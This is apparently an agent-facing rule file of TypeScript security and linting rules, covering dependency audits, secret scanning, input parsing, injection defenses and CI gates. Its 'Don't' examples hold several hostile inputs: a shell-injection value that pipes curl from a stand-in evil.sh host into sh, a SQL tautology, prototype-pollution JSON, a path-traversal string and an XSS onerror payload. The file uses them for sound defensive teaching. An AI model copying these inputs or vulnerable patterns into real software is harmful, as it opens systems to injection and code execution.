---
name: security-and-linting
description: Vulnerability scanning, supply-chain hygiene, boundary input validation, injection defenses, and the lint/format/CI gate workflow for TypeScript projects.
load_when:
  - "Adding, upgrading, or auditing dependencies"
  - "Handling external input: HTTP bodies, environment variables, file contents, user-supplied URLs or paths"
  - "Writing code that builds shell commands, SQL queries, or regexes, or touches the filesystem from user input"
  - "Configuring ESLint, Prettier/Biome, or pre-commit hooks"
  - "Setting up or modifying CI pipelines and quality gates"
  - "Working with secrets, tokens, or .env configuration"
rule_prefix: SEC
---

# Security and Linting

This file governs how a TypeScript project detects vulnerabilities and style defects: dependency and secret scanning, supply-chain hygiene, validating external input at the boundary, injection and traversal defenses, the lint/format toolchain, and the canonical CI gate order. It deliberately leaves compiler strictness to `typescript-language.md`, test design to `testing-tdd.md`, runtime evidence gathering to `live-verification.md`, and server-runtime specifics (HTTP hardening, process management) to `nodejs.md`. Where an addendum file names a framework-specific scanner or rule, it layers on top of — never replaces — the gates defined here.

## Quick reference

| ID | Level | Rule |
| --- | --- | --- |
| SEC-001 | MUST | Commit the lockfile and install with the frozen/ci command in CI |
| SEC-002 | MUST NOT | Never commit `.env` files or secrets; ship a placeholder `.env.example` instead |
| SEC-003 | MUST | Run a secret scanner on staged changes locally and on full history in CI |
| SEC-004 | MUST | Scan dependencies for known vulnerabilities locally and as a blocking CI gate |
| SEC-005 | SHOULD | Suppress unfixable advisories individually, with a written reason and an expiry date |
| SEC-006 | SHOULD | Practice supply-chain hygiene: exact versions, `--ignore-scripts`, name verification, provenance |
| SEC-007 | MUST | Parse all external input at the boundary with a schema library; never trust `process.env`, request bodies, or file contents |
| SEC-008 | MUST | Use parameterized queries only; never build SQL from string concatenation |
| SEC-009 | MUST NOT | Never use `eval` or the `Function` constructor on any input |
| SEC-010 | MUST | Spawn processes with `execFile`/`spawn` and argument arrays; never interpolate into a shell string |
| SEC-011 | MUST | Reject `__proto__`/`constructor`/`prototype` keys and use null-prototype objects or `Map` for untrusted dictionaries |
| SEC-012 | SHOULD | Guard against ReDoS: never compile user-supplied regexes, and lint regex complexity |
| SEC-013 | MUST | Resolve and containment-check every filesystem path derived from user input |
| SEC-014 | SHOULD | Defend outbound fetches of user-supplied URLs against SSRF with protocol and host allowlists |
| SEC-015 | MUST | Lint with a type-checked typescript-eslint preset plus a security plugin |
| SEC-016 | SHOULD | Run a deep static-analysis scanner (Semgrep or CodeQL) in CI |
| SEC-017 | MUST | Use exactly one auto-formatter and enforce it in CI with a check command |
| SEC-018 | SHOULD | Wire pre-commit hooks (husky + lint-staged) as fast feedback; CI remains the gate |
| SEC-019 | MUST | Order CI gates: secret scan, format check, lint, typecheck, test, audit — all blocking |
| SEC-020 | MUST NOT | Never write secrets, tokens, or credentials into logs or error messages |
| SEC-021 | MUST | Escape or sanitize every dynamic value interpolated into HTML or markup |
| SEC-022 | MUST | Generate security-relevant random values with a CSPRNG, never `Math.random()` |

## Rules

### SEC-001 MUST: Commit the lockfile and install with the frozen/ci command in CI

**Why:** The lockfile is the only record of the exact dependency tree you tested; a floating install in CI or on a teammate's machine silently resolves different versions and defeats every audit you ran.

**Do:**

```bash
# lockfile is committed; CI and fresh checkouts install exactly what it says
npm ci                      # npm
pnpm install --frozen-lockfile   # pnpm
yarn install --immutable         # yarn berry
```

**Don't:**

```bash
# resolves fresh versions, mutates the lockfile, installs an untested tree
npm install        # in CI
echo "package-lock.json" >> .gitignore
```

**Exception:** Intentional dependency upgrades run the mutating install locally, and the resulting lockfile diff is reviewed and committed like any other code change.

### SEC-002 MUST NOT: Never commit `.env` files or secrets; ship a placeholder `.env.example` instead

**Why:** Anything committed is in git history forever — rotating a leaked key is expensive and often incomplete. A committed `.env.example` documents which variables exist without exposing any value.

**Do:**

```bash
# .gitignore
.env
.env.*
!.env.example
```

```bash
# .env.example — placeholder values only, safe to commit
DATABASE_URL=postgres://user:password@localhost:5432/app
STRIPE_SECRET_KEY=sk_test_replace_me
```

**Don't:**

```bash
# .env committed with live values
STRIPE_SECRET_KEY=sk_live_<REDACTED>   # a real key here trips push protection — as it should
```

**Exception:** None. If a secret lands in history, rotate it immediately — deleting the file in a later commit does not unpublish it.

### SEC-003 MUST: Run a secret scanner on staged changes locally and on full history in CI

**Why:** Humans and agents both paste tokens into code; a scanner catches the mistake before it reaches the remote, and the CI history scan catches anything that slipped through earlier.

**Do:**

```bash
# pre-commit (fast, staged files only)
gitleaks git --pre-commit --staged

# CI (full history)
gitleaks git --redact
# or: trufflehog git file://. --results=verified --fail
```

**Don't:**

```bash
# relying on code review to spot a 40-character hex string
git commit -m "add config" && git push
```

**Exception:** Confirmed false positives (e.g., a documented test fixture) go in `.gitleaksignore` with a comment explaining why — never by disabling the scan.

### SEC-004 MUST: Scan dependencies for known vulnerabilities locally and as a blocking CI gate

**Why:** Most real-world compromise arrives through a dependency, not your own code; a scan is cheap and the CI gate makes the finding impossible to ignore.

**Do:**

```bash
# local, before opening a PR
npm audit --audit-level=high

# CI gate — fails the build on findings
npm audit --audit-level=high
osv-scanner scan -L package-lock.json      # broader DB, use alongside npm audit
```

**Don't:**

```bash
# audit demoted to a warning nobody reads
npm audit || true
```

**Exception:** Advisory severity threshold may be tuned per project (e.g., `--audit-level=moderate` for security-critical services), but the gate itself must block.

### SEC-005 SHOULD: Suppress unfixable advisories individually, with a written reason and an expiry date

**Why:** Some advisories have no patched version or sit in an unreachable code path; a blanket-disabled audit hides every future finding, while a scoped, expiring suppression keeps the gate honest.

**Do:**

```toml
# osv-scanner.toml (or audit-ci.jsonc "allowlist")
[[IgnoredVulns]]
id = "GHSA-xxxx-xxxx-xxxx"
reason = "Dev-only transitive dep; vulnerable path not reachable. Re-check when upstream #123 lands."
# review by 2026-10-01 — remove or re-justify
```

**Don't:**

```bash
# nukes the entire gate to silence one advisory
npm audit --audit-level=critical   # quietly raised from high to critical forever
```

**Exception:** None — a suppression without a reason and a revisit date is a disabled gate wearing a costume.

### SEC-006 SHOULD: Practice supply-chain hygiene: exact versions, `--ignore-scripts`, name verification, provenance

**Why:** Typosquatted packages, hijacked maintainer accounts, and malicious postinstall scripts are the dominant npm attack vectors; each habit below closes one of those doors.

**Do:**

```bash
# .npmrc
save-exact=true       # applications pin exact versions; the lockfile pins the rest
ignore-scripts=true   # no arbitrary code execution on install
# WARNING: ignore-scripts also suppresses YOUR OWN lifecycle scripts, including
# `prepare` — install husky hooks with an explicit `npm run prepare` (see SEC-018)

# both major package managers now allowlist install scripts per package:
#   pnpm 11: `allowBuilds` in pnpm-workspace.yaml (was `onlyBuiltDependencies`
#            in pnpm <= 10), managed interactively with `pnpm approve-builds`
#   npm 12:  blocks unlisted install scripts by default (advisory since 11.16) —
#            the `allowScripts` field in package.json, managed with
#            `npm install-scripts approve <pkg>` (version-pinned by default)
#            and `npm install-scripts deny <pkg>`
# fallback for npm < 12 only: keep scripts off globally and run `npm rebuild <pkg>`
# manually for the few packages that genuinely need their build step

# delay freshly published versions — malicious releases are usually caught within hours
#   pnpm-workspace.yaml → minimumReleaseAge: 1440   # 24 h — the pnpm 11 default; keep it
#   list genuinely urgent security patches in minimumReleaseAgeExclude
#   npm has no native cooldown — approximate with `npm install --before <date>`

# before adding a dependency: verify the exact name, publisher, and repo
npm view left-pad name maintainers repository.url

# prefer packages published with provenance
npm audit signatures

# projects that PUBLISH packages: publish via npm trusted publishing (OIDC) from CI —
# provenance is attested automatically for public packages; pass --provenance only
# in token-based CI fallbacks. Long-lived publish tokens no longer exist (classic
# tokens revoked Dec 2025; granular tokens default to 7-day expiry, 90-day max) —
# keep 2FA on the publishing account, preferring WebAuthn/passkeys over TOTP
```

**Don't:**

```bash
# one transposed letter installs an attacker's package with install-script execution
npm install lodahs
```

**Exception:** Libraries (not applications) may use caret ranges in `dependencies` to avoid version conflicts downstream; the lockfile still pins their own dev tree. Packages that genuinely need install scripts (e.g., native builds) are allowed individually — pnpm's `allowBuilds` via `pnpm approve-builds`, or npm's `allowScripts` via `npm install-scripts approve` — never by re-enabling scripts globally.

### SEC-007 MUST: Parse all external input at the boundary with a schema library; never trust `process.env`, request bodies, or file contents

**Why:** A type assertion is a promise the outside world never made; parsing with a schema turns untrusted data into a typed value exactly once, at the edge, so everything inside the boundary can rely on the types. Parse, don't validate: the output of the parse is a new typed value, not a boolean blessing on the raw input. For the Node boot-time env pattern this example sketches, see NODE-003 in `nodejs.md`.

**Do:**

```ts
import { z } from "zod";

const Env = z.object({
  DATABASE_URL: z.url(),
  PORT: z.coerce.number().int().min(1).max(65535).default(3000),
});
export const env = Env.parse(process.env); // crashes at boot, not mid-request

const CreateUser = z.object({ email: z.email(), name: z.string().min(1) });
const body = CreateUser.parse(await req.json()); // body is typed AND verified
```

**Don't:**

```ts
const body = (await req.json()) as { email: string; name: string }; // hope-based typing
const port = Number(process.env.PORT); // NaN in production at 3am
const config = JSON.parse(readFileSync("config.json", "utf8")); // any, trusted blindly
```

**Exception:** Data that never crosses a trust boundary (values your own code produced in the same process) does not need re-parsing.

### SEC-008 MUST: Use parameterized queries only; never build SQL from string concatenation

**Why:** String-built SQL is the canonical injection vector; parameterization keeps data and query structure on separate channels, so no input value can change the query's meaning.

**Do:**

```ts
await db.query("SELECT * FROM users WHERE email = $1", [email]);
// or with a query builder / ORM that parameterizes for you:
await orm.user.findMany({ where: { email } });
```

**Don't:**

```ts
await db.query(`SELECT * FROM users WHERE email = '${email}'`); // ' OR '1'='1
```

**Exception:** Identifiers (table/column names) cannot be parameterized — select them from a hardcoded allowlist, never from raw input.

### SEC-009 MUST NOT: Never use `eval` or the `Function` constructor on any input

**Why:** Both compile strings into executable code at full process privilege; there is no input-sanitization scheme that makes that safe, and every legitimate use has a structured alternative.

**Do:**

```ts
const data = JSON.parse(text); // parse data as data

const handlers: Record<string, () => void> = { start, stop }; // dispatch by lookup
handlers[command]?.();
```

**Don't:**

```ts
eval(`config = ${text}`);
const fn = new Function("ctx", userTemplate);
setTimeout(`cleanup('${id}')`, 1000); // string form of setTimeout is eval in disguise
```

**Exception:** None in application code. Build tooling that genuinely generates code writes it to a file and imports it, keeping the generated source reviewable.

### SEC-010 MUST: Spawn processes with `execFile`/`spawn` and argument arrays; never interpolate into a shell string

**Why:** `exec` hands your string to a shell, so any metacharacter in interpolated input (`;`, `|`, `$()`) becomes command execution; `execFile` passes arguments directly to the binary with no shell in between.

**Do:**

```ts
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const run = promisify(execFile);

await run("git", ["log", "--oneline", "--", userPath]); // userPath is data, not syntax
```

**Don't:**

```ts
import { exec } from "node:child_process";
exec(`git log --oneline -- ${userPath}`); // userPath = "; curl evil.sh | sh"
```

**Exception:** A genuinely needed shell feature (globbing, pipes) uses `spawn` with `shell: true` only when every interpolated value comes from your own code, never from external input.

### SEC-011 MUST: Reject `__proto__`/`constructor`/`prototype` keys and use null-prototype objects or `Map` for untrusted dictionaries

**Why:** Merging or key-assigning untrusted objects into plain objects lets an attacker set `__proto__.isAdmin = true` and poison every object in the process. Null-prototype objects and `Map` have no prototype chain to pollute.

**Do:**

```ts
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);

const dict: Record<string, string> = Object.create(null);
for (const [k, v] of Object.entries(input)) {
  if (FORBIDDEN.has(k)) continue;
  dict[k] = v;
}
// or simply:
const map = new Map(Object.entries(input)); // Map keys are inert strings
```

**Don't:**

```ts
const settings = {};
deepMerge(settings, JSON.parse(userJson)); // {"__proto__":{"isAdmin":true}}
```

**Exception:** Schema-parsing the input first (see SEC-007) with a schema that enumerates allowed keys also closes this hole; the null-prototype pattern is for genuinely open-ended key sets.

### SEC-012 SHOULD: Guard against ReDoS: never compile user-supplied regexes, and lint regex complexity

**Why:** Regexes with nested or overlapping quantifiers backtrack exponentially on crafted input, pinning a CPU core with a single request; a user-supplied pattern is an attacker-supplied program for your regex engine.

**Do:**

```ts
// user input is matched AGAINST your patterns, never compiled AS a pattern
const ok = /^[a-z0-9-]{1,64}$/.test(userSlug);

// if user-defined patterns are a real feature, use a linear-time engine
import RE2 from "re2";
const re = new RE2(userPattern); // no backtracking, no blowup
```

**Don't:**

```ts
const re = new RegExp(userPattern);      // attacker controls the program
/^(a+)+$/.test(userInput);               // nested quantifier: exponential on "aaaa...!"
```

**Exception:** Patterns applied only to length-capped, trusted input are lower risk — but lint them anyway (`eslint-plugin-regexp` or the security plugin's unsafe-regex rule, see SEC-015).

### SEC-013 MUST: Resolve and containment-check every filesystem path derived from user input

**Why:** `../` sequences (and encoded variants) walk out of the intended directory, turning a file-download endpoint into an arbitrary-file reader. Resolving to an absolute path and checking containment defeats every encoding trick at once.

**Do:**

```ts
import path from "node:path";

const BASE = path.resolve("/srv/uploads");

function safeJoin(userName: string): string {
  const target = path.resolve(BASE, userName);
  if (target !== BASE && !target.startsWith(BASE + path.sep)) {
    throw new Error("Path escapes base directory");
  }
  return target;
}
```

**Don't:**

```ts
const target = path.join("/srv/uploads", userName); // "../../etc/passwd" resolves right out
return fs.readFile(target);
```

**Exception:** Filenames you generate yourself (UUIDs, content hashes) need no check — only paths containing any user-influenced segment do.

### SEC-014 SHOULD: Defend outbound fetches of user-supplied URLs against SSRF with protocol and host allowlists

**Why:** A server that fetches arbitrary URLs will happily fetch `http://169.254.169.254/` (cloud metadata) or internal admin services on the attacker's behalf, using the server's own network position.

**Do:**

```ts
const ALLOWED_HOSTS = new Set(["api.partner.example"]);

function checkUrl(raw: string): URL {
  const url = new URL(raw);
  if (url.protocol !== "https:") throw new Error("Only https allowed");
  if (!ALLOWED_HOSTS.has(url.hostname)) throw new Error("Host not allowlisted");
  return url;
}
const res = await fetch(checkUrl(userUrl), { redirect: "error" }); // re-check on redirect
```

**Don't:**

```ts
const res = await fetch(userUrl); // file:, internal IPs, metadata endpoints, redirects — all open
```

**Exception:** Genuinely open fetchers (link previews, webhooks to customer URLs) cannot allowlist hosts — they must instead resolve DNS and block private/link-local/loopback ranges, refuse non-HTTP(S) schemes, and re-validate on every redirect hop.

### SEC-015 MUST: Lint with a type-checked typescript-eslint preset plus a security plugin

**Why:** Type-aware rules catch whole bug classes (floating promises, unsafe `any` flows) that syntax-only linting cannot see, and a security plugin flags the injection-shaped patterns from SEC-008 through SEC-013 automatically.

**Do:**

```ts
// eslint.config.mjs — ESLint 10 is flat-config-only (v9 reached EOL 2026-08-06);
// use ESLint-10-compatible plugin majors (e.g., eslint-plugin-security >= 4)
import { defineConfig } from "eslint/config"; // replaces the deprecated tseslint.config() wrapper
import tseslint from "typescript-eslint";
import security from "eslint-plugin-security";
import jsxA11y from "eslint-plugin-jsx-a11y"; // React projects — see `react.md` REACT-015
import tsdoc from "eslint-plugin-tsdoc"; // where doc-comment linting is wanted — see `documentation.md`

export default defineConfig(
  tseslint.configs.recommendedTypeChecked, // or strictTypeChecked
  security.configs.recommended,
  jsxA11y.flatConfigs.recommended, // React projects only
  { plugins: { tsdoc }, rules: { "tsdoc/syntax": "warn" } },
  { languageOptions: { parserOptions: { projectService: true } } },
);
```

```bash
# dead-code detection belongs to the same lint stack: knip runs as a blocking
# CI gate (see `testing-tdd.md` TDD-012)
knip
```

**Don't:**

```ts
// syntax-only preset: no promise, no any-flow, no security coverage
export default [js.configs.recommended];
```

**Exception:** A rule disabled for a specific line requires an inline comment stating why; blanket-disabling a security rule project-wide requires the same written justification as SEC-005.

### SEC-016 SHOULD: Run a deep static-analysis scanner (Semgrep or CodeQL) in CI

**Why:** ESLint sees one file at a time; Semgrep and CodeQL trace data flow across files and catch taint-style bugs (user input reaching a sink through three helpers) that per-file linting structurally cannot.

**Do:**

```bash
# CI step — Semgrep with the community TypeScript + OWASP rulesets
semgrep ci --config p/typescript --config p/owasp-top-ten
# or enable GitHub CodeQL default setup for the repository
```

**Don't:**

```bash
# treating ESLint as the entire static-analysis story for a security-sensitive service
```

**Exception:** Small internal tools may defer this gate; anything handling authentication, payments, or user data should not.

### SEC-017 MUST: Use exactly one auto-formatter and enforce it in CI with a check command

**Why:** Formatting debates burn review cycles and pollute diffs; one formatter with a CI check makes style a solved, non-discussable problem — the formatter's output is the style guide.

**Do:**

```bash
# pick ONE and enforce it:
prettier --check .        # CI gate; locally: prettier --write .
# or
biome ci .                # CI gate; locally: biome check --write .
```

**Don't:**

```jsonc
// Prettier AND Biome formatting the same files — they will fight forever
{ "scripts": { "fmt": "prettier --write . && biome format --write ." } }
```

**Exception:** Generated files and vendored code go in the formatter's ignore file — they are excluded, not hand-formatted.

### SEC-018 SHOULD: Wire pre-commit hooks (husky + lint-staged) as fast feedback; CI remains the gate

**Why:** Catching a lint error at commit time costs seconds; catching it in CI costs a round trip. But hooks are trivially bypassed (`--no-verify`) and don't run for every contributor, so they can never replace the CI gate (SEC-019).

**Do:**

```jsonc
// package.json — lint-staged is for file-scoped commands only: it appends the
// matched filenames to each command, so tools that take no file args don't belong here
{
  "lint-staged": {
    "*.{ts,tsx}": ["prettier --write", "eslint --fix"]
  }
}
```

```bash
# .husky/pre-commit — gitleaks takes no positional file args, so it runs
# directly in the hook, not via lint-staged
npx lint-staged
gitleaks git --pre-commit --staged
```

**Don't:**

```bash
# hooks exist, so CI "doesn't need" the same checks — until someone commits with --no-verify
```

**Exception:** Keep hooks under a few seconds; slow checks (full test suite, deep scans) belong in CI only, or contributors will disable the hooks entirely.

### SEC-019 MUST: Order CI gates: secret scan, format check, lint, typecheck, test, audit — all blocking

**Why:** Cheapest-first ordering fails fast on trivial errors before spending minutes on tests, and making every gate blocking is what turns "we have checks" into "the main branch is always releasable." The list below is the complete required pipeline — the secret scan (SEC-003) is a gate, not a side process.

**Do:**

```bash
# CI pipeline — each step fails the build; order cheapest to costliest
gitleaks git --redact                  # 0. secret scan (SEC-003)
prettier --check .                     # 1. format
eslint . --max-warnings 0              # 2. lint
tsc --noEmit                           # 3. typecheck
npm test                               # 4. tests
npm audit --audit-level=high           # 5. dependency audit
```

**Don't:**

```bash
# non-blocking steps: red X's everyone learns to ignore
npm run lint || true
npm audit; exit 0
```

**Exception:** Independent gates may run in parallel jobs for speed — the invariant is that ALL of them must pass before merge, not their wall-clock sequence. Where a deep static-analysis scanner is adopted (SEC-016), it runs as one more blocking job alongside these.

### SEC-020 MUST NOT: Never write secrets, tokens, or credentials into logs or error messages

**Why:** Logs outlive requests, flow into third-party aggregators, and are readable by far more people than production databases; a token in a log line is a leak with a long shelf life. Error messages returned to clients leak the same material to attackers directly.

**Do:**

```ts
logger.info({ userId, tokenId: token.id }, "cli token redeemed"); // identifiers, not material
logger.error({ err: { code: err.code, message: err.message } }, "db connect failed");
// client-facing errors are generic; details stay server-side
res.status(500).json({ error: "internal_error" });
```

**Don't:**

```ts
logger.info(`auth header: ${req.headers.authorization}`); // bearer token in the aggregator
logger.debug("env", process.env);                          // every secret at once
throw new Error(`connect failed: ${connectionString}`);    // password in the message and stack
```

**Exception:** None for secret material. If a payload must be logged for debugging, redact known-sensitive keys through the logger's redaction config before it leaves the process.

### SEC-021 MUST: Escape or sanitize every dynamic value interpolated into HTML or markup

**Why:** HTML built by string concatenation from external input is script injection (XSS) waiting for its first `<img onerror>` payload — in server-rendered pages and HTML email alike. An auto-escaping template engine neutralizes interpolated values by default; where HTML input is itself a feature, only a maintained sanitizer strips what escaping cannot. `react.md` REACT-016 is the React specialization of this rule.

**Do:**

```ts
// auto-escaping template engine — interpolations are escaped by default
res.send(nunjucks.render("profile.html", { name: userName }));

// where user-authored HTML is a real feature, sanitize with a maintained library
import DOMPurify from "isomorphic-dompurify"; // or sanitize-html
const safe = DOMPurify.sanitize(userHtml);
```

**Don't:**

```ts
res.send(`<h1>Welcome ${userName}</h1>`); // userName = "<img src=x onerror=alert(1)>"
const email = "<p>Hi " + displayName + "</p>"; // HTML email renders in a browser too
```

**Exception:** Markup assembled entirely from values your own code produced, with no external input in any segment, needs no escaping — the rule triggers on the first user-influenced value.

### SEC-022 MUST: Generate security-relevant random values with a CSPRNG, never `Math.random()`

**Why:** `Math.random()` is a predictable PRNG — an attacker who observes a few outputs can reconstruct its state and predict every token, session id, password-reset code, or API key derived from it. The crypto APIs draw from the OS entropy source at no meaningful cost.

**Do:**

```ts
import { randomBytes, randomUUID } from "node:crypto";

const sessionId = randomUUID();
const resetCode = randomBytes(32).toString("base64url");
const nonce = crypto.getRandomValues(new Uint8Array(16)); // browser / edge runtimes
```

**Don't:**

```ts
const token = Math.random().toString(36).slice(2); // predictable — attacker wins
```

**Exception:** Non-security randomness (jitter, sampling, shuffled display order) may use `Math.random()`.
